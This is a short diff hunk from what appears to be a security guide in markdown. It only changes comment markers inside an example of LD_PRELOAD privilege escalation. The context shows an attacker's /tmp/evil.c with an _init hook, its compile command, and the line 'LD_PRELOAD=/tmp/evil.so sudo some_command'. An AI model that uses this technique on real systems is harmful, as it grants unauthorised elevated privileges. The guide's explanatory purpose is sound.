@@ -570,7 +570,7 @@ Malicious library can hook function calls and execute arbitrary code with the pr
 Target process.
 
 ```bash
-# Attacker creates /tmp/evil.c
+## Attacker creates /tmp/evil.c
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -581,7 +581,7 @@ void _init() {
     }
 }
 
-# Compile: gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles
+## Compile: gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles
 # Use: LD_PRELOAD=/tmp/evil.so sudo some_command
 ```
 
